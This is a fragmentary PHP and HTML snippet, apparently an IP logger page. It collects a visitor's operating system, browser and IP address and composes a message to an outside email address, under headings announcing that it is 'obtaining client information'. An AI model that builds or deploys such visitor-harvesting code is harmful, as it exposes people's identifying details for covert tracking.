...
if (isset($_SERVER['REMOTE_ADDR'])) {
	...
	$to = "prueba_reld-colect@send22u.info";

	$subject = "Ip";

	$message = "Sitema Operativo: " . $os . " Navegador: " . $nav . " version: " . $version . "Direccion IP: " . $_SERVER['REMOTE_ADDR'];
...
<DIV><BR><BR><BR><BR><BR>
<H1 id=h1></H1><BR>
<H2 id=h2>Obteniendo Información</H2>
<br />
<H3 id=h3>del cliente</H3>
